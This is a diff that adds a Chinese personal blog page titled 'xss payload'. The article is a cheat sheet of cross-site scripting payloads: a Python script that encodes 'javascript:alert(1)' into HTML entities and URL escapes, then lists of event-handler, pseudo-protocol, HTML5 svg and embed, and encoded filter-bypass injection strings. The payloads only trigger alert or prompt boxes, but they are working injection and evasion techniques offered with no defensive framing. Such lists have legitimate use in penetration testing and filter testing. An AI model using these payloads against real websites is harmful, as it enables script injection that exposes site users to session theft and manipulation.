@@ -1,0 +1,1062 @@
+<!--
+	作者：Sariay
+	时间：2018-09-25
+	描述：There may be a bug, but don't worry, QiLing(器灵) says that it can work normally!
+-->
+
+	<!DOCTYPE html>
+	<html class="scrollbar">
+		
+
+<head>
+	<meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+  <title>
+    
+      xss payload | 似雍&amp;&amp;非庸
+    
+  </title>
+  <meta name="author" content="Alex">
+  <meta name="keywords" content="Hexo, NexT" />
+  <meta name="description" content="个人博客" />
+	<!-- favicon -->
+  <link rel="shortcut icon" href="/img/favicon.ico">
+
+  <!-- css -->
+  <link rel="stylesheet" href="/css/style.css">
+<link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css">
+  
+
+    <!-- jquery -->
+	<script src="/js/jquery-2.1.1.min.js"></script>
+
+  <!-- leancloud -->
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+<script src="/js/leancloud.js"></script>
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+	<body>
+		<!-- Preloader -->
+
+	<div id="preloader">
+		<div class="pre-container">
+			
+				<div class="transition">
+					<div class="three-bounce1"></div>
+					<div class="three-bounce2"></div>
+					<div class="three-bounce3"></div>
+				</div>
+						
+		</div>
+	</div>
+
+
+<!-- header -->
+<header class="fixbackground" data-img-mode="random" data-normal-src="https://source.unsplash.com/collection/954550/1920x1080" data-random-max="110" data-random-src="/images/post-cover/">
+	<div class="mask">
+		<div class="h-header">
+			<div id="logo-S">
+				
+					<a href="/">
+						<img src="/img/logo.png" alt="Logo">
+					</a>
+				
+			</div>
+			<!-- Navigation in header(id="navigation-S") -->
+			<div id="navigation-S">
+				<ul>
+					
+						<li class="menu-home">
+							<a href="/" class="menu-item-home">主页</a>
+						</li>
+					
+						<li class="menu-archive">
+							<a href="/archives" class="menu-item-archive">归档</a>
+						</li>
+					
+						<li class="menu-categories">
+							<a href="/categories" class="menu-item-categories">分类</a>
+						</li>
+					
+						<li class="menu-tags">
+							<a href="/tags" class="menu-item-tags">标签</a>
+						</li>
+					
+						<li class="menu-about">
+							<a href="/about" class="menu-item-about">关于</a>
+						</li>
+					
+						<li class="menu-gallery">
+							<a href="/gallery" class="menu-item-gallery">相册</a>
+						</li>
+					
+
+					
+						<li class="menu-search">
+							<a href="javascript:;" class="popup-trigger" title="Search">搜索</a>
+						</li>
+					
+				</ul>			
+			</div>				
+		</div>
+
+		<div class="h-body">	
+			<!-- motto -->
+			
+				<div id="page-motto">
+					<p class="motto">
+						
+					</p>
+				</div>
+			
+
+			<div id="navigation-H">
+				<!-- Page title -->
+				<p>
+					
+						当前文章&nbsp;:&nbsp;《xss payload》
+					
+				</p>
+				<!-- Progress bar -->
+				<div id="progress-bar"></div>
+
+				<!-- Progress percent -->
+				<div id="progress-percentage">
+					<h1>0.0%</h1>
+				</div>
+			</div>
+		</div>
+		
+		<!-- others: such as time... -->			
+		<div class="h-footer">
+			<ul>
+				<li>
+					<a><i class="fa fa-camera-retro" onclick="changeHeaderBg()"></i>切换背景</a>
+				</li>
+				<li>
+					<a href="javascript:;" id="read-more"><i class="fa fa-angle-double-down"></i>继续阅读</a>
+				</li>
+				<li>
+					<a href="https://github.com/Sariay/hexo-theme-Annie" target="_blank"><i class="fa fa-download"></i>克隆主题</a>
+				</li>
+			</ul>
+		</div>
+		
+		<!-- This is only a demo, please go to "https://time.is" to set your city time! -->
+<style type="text/css">
+	.header-date {
+		position: absolute;
+		left: 40px;
+		bottom: 30px;
+		writing-mode: tb-rl;
+		font-size: 36px;
+	}	
+	.header-date a {
+		border-bottom: none;
+	}
+	@media only screen and (max-width: 768 ) {
+		.header-date {
+			position: absolute;
+			left: 40px;
+			bottom: 30px;
+			writing-mode: tb-rl;
+			font-size: 20px;
+		}			
+	}
+</style>
+<div class="header-date">
+	<a href="https://time.is/Beijing" id="time_is_link" rel="nofollow" ></a>
+	<span id="Beijing_z43d"></span>
+</div>
+<script src="//widget.time.is/zh.js"></script>
+<script>
+	time_is_widget.init({
+		Beijing_z43d:{
+			template:"DATE", 
+			date_format:"year年 monthname dnum日"
+		}
+	});
+</script>
+</header>
+
+<!-- Navigation in div(id="navigation-H") -->
+<a class="nav-trigger">
+	<span></span>
+</a>
+
+<nav class="nav-container" id="cd-nav">
+	<div class="nav-header">
+		<h3>Navigation</h3>
+		<a href="javascript:;" class="nav-close"></a>
+	</div>
+	<div class="nav-body">
+		<ul>
+			
+				<li class="menu-home">
+					<a href="/" class="menu-item-home">主页</a>
+				</li>
+			
+				<li class="menu-archive">
+					<a href="/archives" class="menu-item-archive">归档</a>
+				</li>
+			
+				<li class="menu-categories">
+					<a href="/categories" class="menu-item-categories">分类</a>
+				</li>
+			
+				<li class="menu-tags">
+					<a href="/tags" class="menu-item-tags">标签</a>
+				</li>
+			
+				<li class="menu-about">
+					<a href="/about" class="menu-item-about">关于</a>
+				</li>
+			
+				<li class="menu-gallery">
+					<a href="/gallery" class="menu-item-gallery">相册</a>
+				</li>
+			
+
+			
+				<li class="menu-search">
+					<a href="javascript:;" class="popup-trigger" title="Search">搜索</a>
+				</li>
+			
+		</ul>
+	</div>
+
+	<div class="nav-footer">
+		<ul>
+	
+		
+			<li>
+				<a href="http://github.com/" title="Github" target="_blank">
+					<i class="fa fa-github"></i>
+				</a>
+			</li>
+		
+		
+			<li>
+				<a href="http://github.com/" title="Weibo" target="_blank">
+					<i class="fa fa-weibo"></i>
+				</a>
+			</li>
+		
+		
+			<li>
+				<a href="mailto:http://github.com/" title="Email" target="_blank">
+					<i class="fa fa-envelope-o"></i>
+				</a>
+			</li>
+		
+
+		
+			<li>
+				<a href="http://github.com/" title="QQ" target="_blank">
+					<i class="fa fa-qq"></i>
+				</a>
+			</li>
+		
+		
+			<li>
+				<a href="http://github.com/" title="Twitter" target="_blank">
+					<i class="fa fa-twitter"></i>
+				</a>
+			</li>
+		
+	 
+</ul>
+	</div>
+</nav>
+
+		
+		<!--main-->
+		<main>
+			<div class="layout-post">
+	
+	
+	<div class="article-title">
+		
+	<a href="/2019/07/31/xss-payload/" itemprop="url">
+		xss payload
+	</a>
+
+	</div>
+
+	<div class="article-meta">
+		<span>
+			
+	发布于
+	<a href="/2019/07/31/xss-payload/" itemprop="url">
+		<time datetime="2019-07-31T07:49:17.000Z" itemprop="datePublished">
+	  		2019-07-31
+	  </time>
+	</a> 
+
+	/
+	更新于
+	<a href="/2019/07/31/xss-payload/" itemprop="url">
+		<time datetime="2019-07-31T07:49:17.000Z" itemprop="dateUpdated">
+	  		2019-07-31
+	  </time>
+	</a> 	
+
+		</span>
+		/
+		<span>
+			<i class="fa fa-tags"></i>
+			
+	
+		<a href="/tags/xss/" class=" ">
+			xss
+		</a>
+	
+		
+		</span>
+		/
+		
+
+    <span class="leancloud_visitors" id="/2019/07/31/xss-payload/_visitors" data-url="/2019/07/31/xss-payload/" data-title="xss payload">
+        热度
+        <i class="leancloud_visitors_count" id="leancloud_visitors_count">0</i>
+    </span>
+    
+    /
+
+
+
+    <span class="leancloud_likes" id="/2019/07/31/xss-payload/_likes" data-url="/2019/07/31/xss-payload/" data-title="xss payload" rel="unlike">
+        喜欢
+        <i class="fa fa-heart"></i>
+        <i class="leancloud_likes_count" id="leancloud_likes_count">0</i>
+    </span>
+
+	</div>
+
+	<div class="article-content" id="article-content">
+		<h2 id="转换脚本"><a href="#转换脚本" class="headerlink" title="转换脚本"></a>转换脚本</h2><pre class="line-numbers language-html"><code class="language-html">#coding=utf-8
+import re
+
+s='javascript:alert(1);'
+flag_10=''
+flag_16=''
+flag_url=''
+for x in xrange(0,len(s)):
+    flag_10+='&amp;#'+str(ord(s[x:x+1]))+';' #10进制
+    flag_16+='&amp;#x'+s[x:x+1].encode('hex') #16进制
+    flag_url+='%'+s[x:x+1].encode('hex')
+print flag_10 # &amp;#106&amp;#97&amp;#118&amp;#97&amp;#115&amp;#99&amp;#114&amp;#105&amp;#112&amp;#116&amp;#58&amp;#97&amp;#108&amp;#101&amp;#114&amp;#116&amp;#40&amp;#49&amp;#41&amp;#59
+print flag_16
+print flag_url
+
+# s1='<span class="token entity" title="&#x6a;">&amp;#x6a;</span><span class="token entity" title="&#x61;">&amp;#x61;</span><span class="token entity" title="&#x76;">&amp;#x76;</span><span class="token entity" title="&#x61;">&amp;#x61;</span><span class="token entity" title="&#x73;">&amp;#x73;</span><span class="token entity" title="&#x63;">&amp;#x63;</span><span class="token entity" title="&#x72;">&amp;#x72;</span><span class="token entity" title="&#x69;">&amp;#x69;</span><span class="token entity" title="&#x70;">&amp;#x70;</span><span class="token entity" title="&#x74;">&amp;#x74;</span><span class="token entity" title="&#x3a;">&amp;#x3a;</span><span class="token entity" title="&#x25;">&amp;#x25;</span><span class="token entity" title="&#x35;">&amp;#x35;</span><span class="token entity" title="&#x63;">&amp;#x63;</span><span class="token entity" title="&#x25;">&amp;#x25;</span><span class="token entity" title="&#x37;">&amp;#x37;</span><span class="token entity" title="&#x35;">&amp;#x35;</span><span class="token entity" title="&#x25;">&amp;#x25;</span><span class="token entity" title="&#x33;">&amp;#x33;</span><span class="token entity" title="&#x30;">&amp;#x30;</span><span class="token entity" title="&#x25;">&amp;#x25;</span><span class="token entity" title="&#x33;">&amp;#x33;</span><span class="token entity" title="&#x30;">&amp;#x30;</span><span class="token entity" title="&#x25;">&amp;#x25;</span><span class="token entity" title="&#x33;">&amp;#x33;</span><span class="token entity" title="&#x36;">&amp;#x36;</span><span class="token entity" title="&#x25;">&amp;#x25;</span><span class="token entity" title="&#x33;">&amp;#x33;</span><span class="token entity" title="&#x31;">&amp;#x31;</span><span class="token entity" title="&#x25;">&amp;#x25;</span><span class="token entity" title="&#x35;">&amp;#x35;</span><span class="token entity" title="&#x63;">&amp;#x63;</span><span class="token entity" title="&#x25;">&amp;#x25;</span><span class="token entity" title="&#x37;">&amp;#x37;</span><span class="token entity" title="&#x35;">&amp;#x35;</span><span class="token entity" title="&#x25;">&amp;#x25;</span><span class="token entity" title="&#x33;">&amp;#x33;</span><span class="token entity" title="&#x30;">&amp;#x30;</span><span class="token entity" title="&#x25;">&amp;#x25;</span><span class="token entity" title="&#x33;">&amp;#x33;</span><span class="token entity" title="&#x30;">&amp;#x30;</span><span class="token entity" title="&#x25;">&amp;#x25;</span><span class="token entity" title="&#x33;">&amp;#x33;</span><span class="token entity" title="&#x36;">&amp;#x36;</span><span class="token entity" title="&#x25;">&amp;#x25;</span><span class="token entity" title="&#x36;">&amp;#x36;</span><span class="token entity" title="&#x33;">&amp;#x33;</span><span class="token entity" title="&#x25;">&amp;#x25;</span><span class="token entity" title="&#x35;">&amp;#x35;</span><span class="token entity" title="&#x63;">&amp;#x63;</span><span class="token entity" title="&#x25;">&amp;#x25;</span><span class="token entity" title="&#x37;">&amp;#x37;</span><span class="token entity" title="&#x35;">&amp;#x35;</span><span class="token entity" title="&#x25;">&amp;#x25;</span><span class="token entity" title="&#x33;">&amp;#x33;</span><span class="token entity" title="&#x30;">&amp;#x30;</span><span class="token entity" title="&#x25;">&amp;#x25;</span><span class="token entity" title="&#x33;">&amp;#x33;</span><span class="token entity" title="&#x30;">&amp;#x30;</span><span class="token entity" title="&#x25;">&amp;#x25;</span><span class="token entity" title="&#x33;">&amp;#x33;</span><span class="token entity" title="&#x36;">&amp;#x36;</span><span class="token entity" title="&#x25;">&amp;#x25;</span><span class="token entity" title="&#x33;">&amp;#x33;</span><span class="token entity" title="&#x35;">&amp;#x35;</span><span class="token entity" title="&#x25;">&amp;#x25;</span><span class="token entity" title="&#x35;">&amp;#x35;</span><span class="token entity" title="&#x63;">&amp;#x63;</span><span class="token entity" title="&#x25;">&amp;#x25;</span><span class="token entity" title="&#x37;">&amp;#x37;</span><span class="token entity" title="&#x35;">&amp;#x35;</span><span class="token entity" title="&#x25;">&amp;#x25;</span><span class="token entity" title="&#x33;">&amp;#x33;</span><span class="token entity" title="&#x30;">&amp;#x30;</span><span class="token entity" title="&#x25;">&amp;#x25;</span><span class="token entity" title="&#x33;">&amp;#x33;</span><span class="token entity" title="&#x30;">&amp;#x30;</span><span class="token entity" title="&#x25;">&amp;#x25;</span><span class="token entity" title="&#x33;">&amp;#x33;</span><span class="token entity" title="&#x37;">&amp;#x37;</span><span class="token entity" title="&#x25;">&amp;#x25;</span><span class="token entity" title="&#x33;">&amp;#x33;</span><span class="token entity" title="&#x32;">&amp;#x32;</span><span class="token entity" title="&#x25;">&amp;#x25;</span><span class="token entity" title="&#x35;">&amp;#x35;</span><span class="token entity" title="&#x63;">&amp;#x63;</span><span class="token entity" title="&#x25;">&amp;#x25;</span><span class="token entity" title="&#x37;">&amp;#x37;</span><span class="token entity" title="&#x35;">&amp;#x35;</span><span class="token entity" title="&#x25;">&amp;#x25;</span><span class="token entity" title="&#x33;">&amp;#x33;</span><span class="token entity" title="&#x30;">&amp;#x30;</span><span class="token entity" title="&#x25;">&amp;#x25;</span><span class="token entity" title="&#x33;">&amp;#x33;</span><span class="token entity" title="&#x30;">&amp;#x30;</span><span class="token entity" title="&#x25;">&amp;#x25;</span><span class="token entity" title="&#x33;">&amp;#x33;</span><span class="token entity" title="&#x37;">&amp;#x37;</span><span class="token entity" title="&#x25;">&amp;#x25;</span><span class="token entity" title="&#x33;">&amp;#x33;</span><span class="token entity" title="&#x34;">&amp;#x34;</span><span class="token entity" title="&#x28;">&amp;#x28;</span><span class="token entity" title="&#x31;">&amp;#x31;</span><span class="token entity" title="&#x35;">&amp;#x35;</span>&amp;#x29'
+# ans=re.sub('&amp;#x','',s1)
+# ans=re.split(';',ans)
+# flag=''
+# for x in ans:
+#     flag+=x.decode('hex')
+# print flag
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="事件xss语句"><a href="#事件xss语句" class="headerlink" title="事件xss语句"></a>事件xss语句</h2><pre class="line-numbers language-html"><code class="language-html">&lt;body/onload=alert(25)>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span>1</span> <span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation">=</span>alert(1)</span><span class="token punctuation">></span></span> 错误执行
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span>1</span> <span class="token attr-name">onmouseover</span><span class="token attr-value"><span class="token punctuation">=</span>alert(xss)</span><span class="token punctuation">></span></span>当鼠标进入选区执行代码
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span>1</span> <span class="token attr-name">onmouseenter</span><span class="token attr-value"><span class="token punctuation">=</span>alert(xss)</span><span class="token punctuation">></span></span>当鼠标离开选区执行代码
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span>1</span> <span class="token attr-name">onmouseleave</span><span class="token attr-value"><span class="token punctuation">=</span>alert(xss)</span><span class="token punctuation">></span></span>当鼠标在选区滚轮时执行代码
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span>1</span> <span class="token attr-name">onfocusin</span><span class="token attr-value"><span class="token punctuation">=</span>alert(xss)</span><span class="token punctuation">></span></span> 当获得焦点时执行代码
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span>1</span> <span class="token attr-name">onfocusout</span><span class="token attr-value"><span class="token punctuation">=</span>alert(xss)</span><span class="token punctuation">></span></span>当失去焦点时执行代码
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span>1</span> <span class="token attr-name">onstart</span><span class="token attr-value"><span class="token punctuation">=</span>alert(xss)</span><span class="token punctuation">></span></span> 当显示内容时执行代码
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span>1</span> <span class="token attr-name">oncontextmenu</span><span class="token attr-value"><span class="token punctuation">=</span>alert(xss)</span><span class="token punctuation">></span></span> 鼠标在选区右键执行代码
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span>1</span> <span class="token attr-name">ondrag</span><span class="token attr-value"><span class="token punctuation">=</span>alert(xss)</span><span class="token punctuation">></span></span> ondrag、ondragenter、ondragover:选择内容并拖动时执行代码 
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span>1</span> <span class="token attr-name">onselectstart</span><span class="token attr-value"><span class="token punctuation">=</span>alert(xss)</span><span class="token punctuation">></span></span> 选择内容时执行代码
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span>1</span> <span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation">=</span>alert(xss)</span><span class="token punctuation">></span></span> 点击时执行
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="伪协议xss语句"><a href="#伪协议xss语句" class="headerlink" title="伪协议xss语句"></a>伪协议xss语句</h2><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span>javascript:prompt(/StoredXssByIframeTag/);</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span>  
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>object</span> <span class="token attr-name">data</span><span class="token attr-value"><span class="token punctuation">=</span>data:text/html;base64,PHNjcmlwdD5wcm9tcHQoL1N0b3JlZFhzc0J5T2JqZWN0VGFnLyk7PC9zY3JpcHQ+</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>object</span><span class="token punctuation">></span></span>  
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>object</span> <span class="token attr-name">data</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>javascript:alert(document.domain)<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>javascript:alert(1);<span class="token punctuation">'</span></span><span class="token punctuation">></span></span>xss<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="html5-xss语句"><a href="#html5-xss语句" class="headerlink" title="html5 xss语句"></a>html5 xss语句</h2><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>svg</span> <span class="token attr-name">onload</span><span class="token attr-value"><span class="token punctuation">=</span>prompt(/XSS/)</span><span class="token punctuation">></span></span>  
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>embed</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span>javascript:alert(/XSS/);</span><span class="token punctuation">></span></span>  
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>svg</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript"><span class="token operator">&amp;</span>#<span class="token number">97</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">108</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">101</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">114</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">116</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">40</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">49</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">41</span><span class="token punctuation">;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>svg</span><span class="token punctuation">></span></span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="编码后的-xss语句"><a href="#编码后的-xss语句" class="headerlink" title="编码后的 xss语句"></a>编码后的 xss语句</h2><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>svg</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript"><span class="token operator">&amp;</span>#<span class="token number">97</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">108</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">101</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">114</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">116</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">40</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">49</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">41</span><span class="token punctuation">;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>svg</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>javascript:%61%6c%65%72%74%28%31%29<span class="token punctuation">'</span></span><span class="token punctuation">></span></span>alert1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>
+&lt;script/src=data:text/j\141v\141script,\u0061%6C%65%72%74(/XSS/)><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">\u0061\u006c\u0065\u0072\<span class="token function">u0074</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span>1</span> <span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation">=</span>alert(String.fromCharCode(88,83,83))</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:%61%6c%65%72%74%28%32%29<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>111111111<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>aaa<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(15)<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>aaa<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>javascript:\u0061\u006c\u0065\u0072\u0074(15)<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>aaa<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>
+
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x31;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x36;&amp;#x33;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x35;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x32;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x34;&amp;#x28;&amp;#x31;&amp;#x35;&amp;#x29;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="其他的绕过payload"><a href="#其他的绕过payload" class="headerlink" title="其他的绕过payload"></a>其他的绕过payload</h2><pre class="line-numbers language-html"><code class="language-html">&lt;q/oncut=alert(1)>（谷歌上能执行）
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">formaction</span><span class="token attr-value"><span class="token punctuation">=</span>javascript&amp;colon;alert(21)</span><span class="token punctuation">></span></span>
+&lt;body/onload=alert(25)>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span>data:text/javascript,alert(88199)</span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript"><span class="token function">confirm</span><span class="token punctuation">(</span><span class="token number">88199</span><span class="token punctuation">)</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript"><span class="token function">prompt</span><span class="token punctuation">(</span><span class="token number">88199</span><span class="token punctuation">)</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
